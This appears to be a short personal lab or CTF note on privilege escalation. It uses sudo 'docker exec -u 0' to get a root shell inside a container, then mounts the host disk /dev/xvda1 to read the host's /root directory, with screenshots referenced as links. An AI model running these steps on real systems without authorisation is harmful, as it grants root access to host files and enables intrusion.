### Docker exec

![[Pasted image 20250718100336.png]]

Find container ID from running processes:

![file:///tmp/.SX3192/1.png](file:///tmp/.SX3192/1.png)

Enter docker container as root:

`-u 0` - runs as root inside the container

![[Pasted image 20250718110113.png]]

Enumerate disks:

![[Pasted image 20250718110629.png]]

Mount system files inside the container:

![[Pasted image 20250718110823.png]]

Summary:

```bash
sudo /snap/bin/docker exec -u 0 -it <container id> /bin/bash
df -h
fdisk -l
mkdir /mnt/xvda1
mount /dev/xvda1 /mnt/xvda1
ls -lash ls /mnt/xvda1/root
```